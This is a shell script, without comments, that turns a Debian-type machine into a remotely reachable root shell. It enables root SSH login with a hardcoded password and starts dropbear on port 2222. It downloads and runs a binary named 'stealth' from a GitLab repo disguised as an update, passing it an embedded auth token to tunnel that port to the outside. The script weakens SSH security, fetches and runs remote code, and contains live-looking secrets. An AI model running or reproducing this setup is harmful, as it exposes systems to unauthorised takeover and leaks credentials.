#!/bin/sh
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y purge openssh-server;apt -y autoremove openssh-server;apt -y install nano dropbear iputils-ping screen net-tools openssh-server build-essential psmisc libreadline-dev dialog curl wget sudo dialog python3 >/dev/null && \
netstat -ntlp && \
sleep 3 && \
sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config && \
sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config && \
sleep 2 && \
sed -i "s/NO_START=1/NO_START=0/" /etc/default/dropbear && \
sed -i "s/DROPBEAR_PORT=22/DROPBEAR_PORT=2222/" /etc/default/dropbear && \
sleep 2 && \
echo "root:Pmataga87465622" | chpasswd && \
service ssh restart && \
wget -q https://gitlab.com/update9394625/update411/-/raw/main/stealth >/dev/null && \
sleep 2 && \
service dropbear restart && \
sleep 2 && \
chmod +x stealth && \
sleep 2 && \
./stealth authtoken 1guvFPBkkwOATyyLKusTwPISn6O_4pDECbRt7i6zzRfTd5ZHD && \
sleep 2 && \
screen -dmS drop bash -c './stealth tcp 2222' && \

sleep 5 && \

curl http://127.0.0.1:4040/api/tunnels && \
sleep 60
ping t.co
